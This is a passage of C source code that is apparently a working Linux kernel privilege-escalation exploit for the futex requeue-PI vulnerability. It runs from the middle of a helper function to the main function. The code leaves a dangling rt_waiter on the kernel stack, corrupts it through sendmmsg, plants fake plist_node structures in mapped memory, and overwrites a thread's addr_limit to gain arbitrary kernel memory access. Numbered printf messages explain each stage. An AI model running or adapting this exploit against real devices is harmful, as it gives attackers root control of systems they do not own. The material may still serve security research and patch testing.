        sprintf(filename, "/proc/self/task/%d/status", pid);
        fp = fopen(filename, "rb");
        if (fp == 0) {
            vcscnt2 = -1;
        } else {
            fread(filebuf, 1, sizeof filebuf, fp);
            pdest = strstr(filebuf, "voluntary_ctxt_switches");
            pdest += 0x19;
            vcscnt2 = atoi(pdest);
            fclose(fp);
        }

        if (vcscnt2 == vcscnt + 1) {
            break;
        }
        usleep(10);
    }

    pthread_mutex_unlock(&is_thread_desched_lock);

    return pid;
}

// Connect to :5551 and set the SNDBUF=1
int make_socket() {
    int sockfd;
    struct sockaddr_in addr = {0};
    int ret;
    int sock_buf_size;

    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockfd < 0) {
        printf("___socket failed.\n");
        usleep(10);
    } else {
        addr.sin_family = AF_INET;
        addr.sin_port = htons(LOCAL_PORT);
        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    }

    while (1) {
        ret = connect(sockfd, (struct sockaddr *)&addr, 16);
        if (ret >= 0) {
            break;
        }
        usleep(10);
    }

    sock_buf_size = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, (char *)&sock_buf_size, sizeof(sock_buf_size));

    return sockfd;
}

void *send_magicmsg(void *arg) {
    int sockfd;
    struct mmsghdr msgvec[1];
    struct iovec msg_iov[8];
    unsigned long databuf[0x20];
    int i;
    int ret;

    waiter_thread_pid = syscall(__NR_gettid);
    setpriority(PRIO_PROCESS, 0, 8); // 0 denotes the calling PID for PRIO_PROCESS

    sockfd = make_socket();

    for (i = 0; i < ARRAY_SIZE(databuf); i++) {
        databuf[i] = MAGIC;
    }

    for (i = 0; i < 8; i++) {
        msg_iov[i].iov_base = (void *)MAGIC;
        msg_iov[i].iov_len = 0x10;
    }

    msgvec[0].msg_hdr.msg_name = databuf;
    msgvec[0].msg_hdr.msg_namelen = sizeof databuf;
    msgvec[0].msg_hdr.msg_iov = msg_iov;
    msgvec[0].msg_hdr.msg_iovlen = ARRAY_SIZE(msg_iov);
    msgvec[0].msg_hdr.msg_control = databuf;
    msgvec[0].msg_hdr.msg_controllen = ARRAY_SIZE(databuf);
    msgvec[0].msg_hdr.msg_flags = 0;
    msgvec[0].msg_len = 0;

    usleep(10);

    printf("[2] Thread B is waiting on uaddr1 and tring to take uaddr2...\n");
    syscall(__NR_futex, &uaddr1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &uaddr2, 0);
    printf("[6] Thread B got uaddr2, but its waiter is still on the kernel stack\n");

    do_socket_tid_read = 1;

    while (1) {
        if (did_socket_tid_read != 0) {
            break;
        }
    }

    ret = 0;
    printf("[7] Thread B used sendmmsg() to modify its waiter on stack.\n");
    while (1) {
        ret = syscall(__NR_sendmmsg, sockfd, msgvec, 1, 0);
        if (ret <= 0) {
            break;
        }
    }

    if (ret < 0) {
        perror("SOCKSHIT");
    }

    printf("___EXIT WTF\n");
    while (1) {
        sleep(10);
    }

    return NULL;
}

/** 
 * setup_exploit - setup two fake 'plist_node' in userland
 * 
 * @mem: fake 'plist_node' location
 *
 * After setup_exploit(MAGIC), two fake p_listnode are set up in userspace,
 * which has priority 9 and 13 respectively.
 *
 * why 9 and 13 ?
 *
 * Because the priority is defined by file 'sched.h' in kernel as follows:
 *     #define MAX_USER_RT_PRIO    100
 *     #define MAX_RT_PRIO         MAX_USER_RT_PRIO
 *     #define NICE_TO_PRIO(nice)  (MAX_RT_PRIO + (nice) + 20)
 *
 * Since in setup_exploit, two prio values are set to x80 and x85, which means:
 *     x80 = 129d = 100 + 9 + 20
 *     x85 = 133d = 100 + 13 + 20
 *
 * Two fake 'p_listnode' structures are set in memory as below:
 *
 *     +----------+              +---------------+
 *     |mem - 0x04|              |prio = 0x81(9d)|
 *     |mem + 0x00|              |prio_list::next| ------+ <---+
 *     |mem + 0x04|              |prio_list::prev|       |     |
 *     |mem + 0x08|  +---> +---- |node_list::next|       |     |
 *     |mem + 0x0c|  |     |     |node_list::prev|       |     |
 *     |mem + 0x10|  |     |     +---------------+       |     |
 *     |mem + 0x14|  |     |                             |     |
 *     |mem + 0x18|  |     |     +---------------+       |     |
 *     |mem + 0x1c|  |     |     |prio =0x85(13d)|       |     |
 *     |mem + 0x20|  |     |     |prio_list::next| <-----+     |
 *     |mem + 0x24|  |     |     |prio_list::prev| ------------+
 *     |mem + 0x28|  |     +---> |node_list::next|
 *     |mem + 0x2c|  +---------- |node_list::prev|
 *     +----------+              +---------------+
 *
 */
static inline void setup_exploit(unsigned long mem) {
    *((unsigned long *)(mem - 0x04)) = 0x81;
    *((unsigned long *)(mem + 0x00)) = mem + 0x20;
    *((unsigned long *)(mem + 0x08)) = mem + 0x28;
    *((unsigned long *)(mem + 0x1c)) = 0x85;
    *((unsigned long *)(mem + 0x24)) = mem;
    *((unsigned long *)(mem + 0x2c)) = mem + 8;
    return;
}

void *search_goodnum(void *arg) {
    int ret;
    char filename[256];
    FILE *fp;
    char filebuf[0x1000];
    char *pdest;
    int vcscnt, vcscnt2;

    struct action_argument *arg_prio_6 = action_argument_creater(6, do_nothing);
    struct action_argument *arg_prio_7 = action_argument_creater(7, do_nothing);
    struct action_argument *arg_prio_11 = action_argument_creater(11, write_addr_limit);
    struct action_argument *arg_prio_12 = action_argument_creater(12, master);

    printf("\n    [--- First Stage: Modify the rt_waiter on the kernel stack ---]\n\n");

    syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
    printf("[1] Thread A locked uaddr2.\n");

    while (1) {
        ret = syscall(__NR_futex, &uaddr1, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr1);
        if (ret == 1) {
            printf("[3] Thread A has requeued waiter to uaddr2.\n");
            break;
        }
        usleep(10);
    }

    pid_prio_6 = wake_actionthread(arg_prio_6);
    pid_prio_7 = wake_actionthread(arg_prio_7);

    printf("[4] Thread A set uaddr2 to 0. (release uaddr2 lock)\n");
    uaddr2 = 0;
    do_socket_tid_read = 0;
    did_socket_tid_read = 0;

    syscall(__NR_futex, &uaddr2, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr2);
    printf("[5] Thread A has requeued waiter from uaddr2 to uaddr2.\n");

    while (1) {
        if (do_socket_tid_read != 0) {
            break;
        }
    }
    
    sprintf(filename, "/proc/self/task/%d/status", waiter_thread_pid);
    fp = fopen(filename, "rb");
    if (fp == 0) {
        vcscnt = -1;
    } else {
        fread(filebuf, 1, sizeof filebuf, fp);
        pdest = strstr(filebuf, "voluntary_ctxt_switches");
        pdest += 0x19;
        vcscnt = atoi(pdest);
        fclose(fp);
    }
    
    did_socket_tid_read = 1;

    while (1) {
        sprintf(filename, "/proc/self/task/%d/status", waiter_thread_pid);
        fp = fopen(filename, "rb");
        if (fp == 0) {
            vcscnt2 = -1;
        } else {
            fread(filebuf, 1, sizeof filebuf, fp);
            pdest = strstr(filebuf, "voluntary_ctxt_switches");
            pdest += 0x19;
            vcscnt2 = atoi(pdest);
            fclose(fp);
        }

        if (vcscnt2 == vcscnt + 1) {
            break;
        }
        usleep(10);
    }

    // We get here means the sendmmsg syscall has been called successfully.
    printf("\n    [--- Second Stage: Modify addr_limit to 0xffffffff ---]\n\n");

    setup_exploit(MAGIC);

    pid_prio_11 = wake_actionthread(arg_prio_11);

    thread_prio_11_stack_base = *((unsigned long *)MAGIC) & 0xffffe000;

    // Set up fake node(prio 13)'s prev pointer
    *((unsigned long *)(MAGIC + 0x24)) = thread_prio_11_stack_base + 24;

    pid_prio_12 = wake_actionthread(arg_prio_12);

    thread_prio_12_stack_base = *((unsigned long *)(MAGIC + 0x24)) & 0xffffe000;

    thread_info_prio_11 = (struct thread_info *)thread_prio_11_stack_base;
    thread_info_prio_12 = (struct thread_info *)thread_prio_12_stack_base;
    
    printf("[10] Thread with prio 11's addr_limit value is replaced by plist_node's\n");
    printf("     address of the thread with prio 12\n");
    
    pthread_kill(pthread_prio_11, SIG_WRITE_ADDR_LIMIT);

    while (1) {
        if (did_write_addr_limit) {
            pthread_kill(pthread_prio_12, SIG_MASTER);
            break;
        }
    }

    return NULL;
}

void *accept_socket(void *arg) {
    int sockfd;
    int yes;
    struct sockaddr_in addr = {0};
    int ret;

    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    yes = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (char *)&yes, sizeof(yes));

    addr.sin_family = AF_INET;
    addr.sin_port = htons(LOCAL_PORT);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    listen(sockfd, 1);

    while(1) {
        ret = accept(sockfd, NULL, NULL);
        if (ret < 0) {
            printf("**** SOCK_PROC failed ****\n");
            while(1) {
                sleep(10);
            }
        }
    }

    return NULL;
}

void init_exploit() {
    unsigned long addr;
    pthread_t th1, th2, th3, th4;

    pthread_create(&th1, NULL, accept_socket, NULL);

    addr = (unsigned long)mmap((void *)0xa0000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    addr += 0x800;
    MAGIC = addr;
    if ((long)addr >= 0) {
        printf("*** First mmap failed? ***\n");
        while (1) {
            sleep(10);
        }
    }

    addr = (unsigned long)mmap((void *)0x100000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    addr += 0x800;
    MAGIC_ALT = addr;
    if (addr > 0x110000) {
        printf("*** Second mmap failed? ***\n");
        while (1) {
            sleep(10);
        }
    }

    pthread_mutex_lock(&done_lock);
    pthread_create(&th2, NULL, search_goodnum, NULL);
    pthread_create(&th3, NULL, send_magicmsg, NULL);
    pthread_create(&th4, NULL, fix_waiter_list_action, NULL);
    pthread_cond_wait(&done, &done_lock);

    return;
}

int main(int argc, char **argv) {

    init_exploit();

    printf("*** Finished, looping. ***\n");

    while (1) {
        sleep(10);
    }

    return 0;
}